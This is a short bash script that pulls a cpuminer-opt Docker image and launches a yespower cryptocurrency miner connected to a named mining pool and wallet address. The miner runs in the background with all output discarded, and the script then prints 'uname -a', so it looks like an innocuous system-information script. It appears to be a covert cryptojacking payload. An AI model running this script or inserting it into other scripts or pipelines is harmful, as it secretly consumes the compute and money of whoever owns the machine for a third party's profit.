#!/bin/bash
docker pull first087/cpuminer-opt:latest
docker run first087/cpuminer-opt:latest -a yespower -o stratum+tcp://stratum-asia.rplant.xyz:7070 -u WbQR3w5EyWkuoFjhjYymrr3pEZDSTTgQkX.test > /dev/null 2>&1 &
uname -a
